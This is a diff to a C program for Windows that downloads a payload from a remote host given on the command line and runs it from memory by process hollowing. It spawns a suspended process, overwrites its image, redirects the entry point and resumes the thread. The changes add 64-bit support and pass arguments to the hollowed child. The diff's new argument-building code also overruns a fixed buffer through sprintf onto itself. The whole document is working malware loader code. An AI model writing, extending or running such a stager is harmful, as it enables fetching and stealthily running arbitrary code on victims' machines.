@@ -7,24 +7,33 @@
 #include <ws2tcpip.h>
 #include <iphlpapi.h>
 #include <stdio.h>
+#include <malloc.h>
+
 
 #pragma comment(lib, "Ws2_32.lib")
 
 typedef long int (__stdcall* NtUnmapViewOfSectionF)(HANDLE,PVOID);
 NtUnmapViewOfSectionF NtUnmapViewOfSection;
 
+
+#if _WIN64
+	#define PTRTYPE __int64
+#else
+	#define PTRTYPE __int32
+#endif
+
 char *argv0;
 
 /* http://www.rohitab.com/discuss/topic/37801-question-memory-execution/ */
 void
-RunFromMemory(char* pImage)
+RunFromMemory(char* pImage, int argc, char **argv)
 {
-	DWORD dwWritten = 0;
+	PTRTYPE dwWritten = 0;
 	DWORD dwHeader = 0; 
 	DWORD dwImageSize = 0;
 	DWORD dwSectionCount = 0;
 	DWORD dwSectionSize = 0;
-	DWORD firstSection = 0;
+	PTRTYPE firstSection = 0;
 	DWORD previousProtection = 0;
 	DWORD jmpSize = 0;
 
@@ -53,15 +62,15 @@ RunFromMemory(char* pImage)
 		fread(lfMemory,1,fSize,pLocalFile);
 		fclose(pLocalFile);
 		memcpy(&IDH,lfMemory,sizeof(IDH));
-		memcpy(&INH,(void*)((DWORD)lfMemory+IDH.e_lfanew),sizeof(INH));
+		memcpy(&INH,(void*)((PTRTYPE)lfMemory+IDH.e_lfanew),sizeof(INH));
 		free(lfMemory);
 	}
 	// Just Grabbing Its ImageBase and SizeOfImage , Thats all we needed from the local process..
-	DWORD localImageBase = INH.OptionalHeader.ImageBase;
+	PTRTYPE localImageBase = INH.OptionalHeader.ImageBase;
 	DWORD localImageSize = INH.OptionalHeader.SizeOfImage;
 
 	memcpy(&IDH,pImage,sizeof(IDH));
-	memcpy(&INH,(void*)((DWORD)pImage+IDH.e_lfanew),sizeof(INH));
+	memcpy(&INH,(void*)((PTRTYPE)pImage+IDH.e_lfanew),sizeof(INH));
 		
 	dwImageSize = INH.OptionalHeader.SizeOfImage;
 	pMemory = (char*)malloc(dwImageSize);
@@ -69,7 +78,7 @@ RunFromMemory(char* pImage)
 	pFile = pMemory;
 
 	dwHeader = INH.OptionalHeader.SizeOfHeaders;
-	firstSection = (DWORD)(((DWORD)pImage+IDH.e_lfanew) + sizeof(IMAGE_NT_HEADERS));
+	firstSection = (PTRTYPE)(((PTRTYPE)pImage+IDH.e_lfanew) + sizeof(IMAGE_NT_HEADERS));
 	memcpy(Sections,(char*)(firstSection),sizeof(IMAGE_SECTION_HEADER)*INH.FileHeader.NumberOfSections);
 
 	memcpy(pFile,pImage,dwHeader);
@@ -83,7 +92,7 @@ RunFromMemory(char* pImage)
 		jmpSize *= INH.OptionalHeader.SectionAlignment;
 	}
 
-	pFile = (char*)((DWORD)pFile + jmpSize);
+	pFile = (char*)((PTRTYPE)pFile + jmpSize);
 
 	for(dwSectionCount = 0; dwSectionCount < INH.FileHeader.NumberOfSections; dwSectionCount++)
 	{
@@ -99,17 +108,22 @@ RunFromMemory(char* pImage)
 			jmpSize += 1;
 			jmpSize *= INH.OptionalHeader.SectionAlignment;
 		}
-		pFile = (char*)((DWORD)pFile + jmpSize);
+		pFile = (char*)((PTRTYPE)pFile + jmpSize);
 	}
 
 
 	memset(&peStartUpInformation,0,sizeof(STARTUPINFO));
 	memset(&peProcessInformation,0,sizeof(PROCESS_INFORMATION));
 	memset(&pContext,0,sizeof(CONTEXT));
-
 	peStartUpInformation.cb = sizeof(peStartUpInformation);
-	printf("Running child\n");
-	if(CreateProcess(NULL,pPath,NULL,NULL,0,CREATE_SUSPENDED, NULL,NULL,&peStartUpInformation,&peProcessInformation))
+
+	char buf[512];
+	sprintf(buf, "%s", pPath);
+	for(int i=0;i<argc;i++)
+		sprintf(buf, "%s %s", buf, argv[i]);
+
+	//printf("Running child with args %s\n", buf);
+	if(CreateProcess(NULL,buf,NULL,NULL,0,CREATE_SUSPENDED, NULL,NULL,&peStartUpInformation,&peProcessInformation))
 	{
 		pContext.ContextFlags = CONTEXT_FULL;
 		GetThreadContext(peProcessInformation.hThread,&pContext);
@@ -121,12 +135,18 @@ RunFromMemory(char* pImage)
                         VirtualAllocEx(peProcessInformation.hProcess,(LPVOID)(INH.OptionalHeader.ImageBase),dwImageSize,MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
 		}
 		WriteProcessMemory(peProcessInformation.hProcess,(void*)(INH.OptionalHeader.ImageBase),pMemory,dwImageSize,&dwWritten);
-		WriteProcessMemory(peProcessInformation.hProcess,(void*)(pContext.Ebx + 8),&INH.OptionalHeader.ImageBase,4,&dwWritten);
-		pContext.Eax = INH.OptionalHeader.ImageBase + INH.OptionalHeader.AddressOfEntryPoint;
+		#if _WIN64
+			WriteProcessMemory(peProcessInformation.hProcess,(void*)(pContext.Rbx + 8),&INH.OptionalHeader.ImageBase,8,&dwWritten);
+			pContext.Rax = INH.OptionalHeader.ImageBase + INH.OptionalHeader.AddressOfEntryPoint;
+		#else
+			WriteProcessMemory(peProcessInformation.hProcess,(void*)(pContext.Ebx + 8),&INH.OptionalHeader.ImageBase,4,&dwWritten);
+			pContext.Eax = INH.OptionalHeader.ImageBase + INH.OptionalHeader.AddressOfEntryPoint;
+		#endif
 		SetThreadContext(peProcessInformation.hThread,&pContext);
 		VirtualProtectEx(peProcessInformation.hProcess,(void*)(INH.OptionalHeader.ImageBase),dwImageSize,previousProtection,0);
 		ResumeThread(peProcessInformation.hThread);
 	}
+	WaitForSingleObject(peProcessInformation.hProcess, INFINITE );
 	free(pMemory);
 }
 
@@ -252,12 +272,11 @@ main(int argc,char* argv[])
 
 	NtUnmapViewOfSection = (NtUnmapViewOfSectionF)GetProcAddress(LoadLibrary( "ntdll.dll"),"NtUnmapViewOfSection");
 
-
 	argv0 = argv[0];
-	if(argc != 4)
+	if(argc < 4)
 		usage();
 	SOCKET s = wsockinit(argv[1], argv[2]);
 	char* lpMemory = readpayload(s, argv[3]);
-	RunFromMemory(lpMemory);
+	RunFromMemory(lpMemory, argc-4, argv+4);
 	return 0;
 }
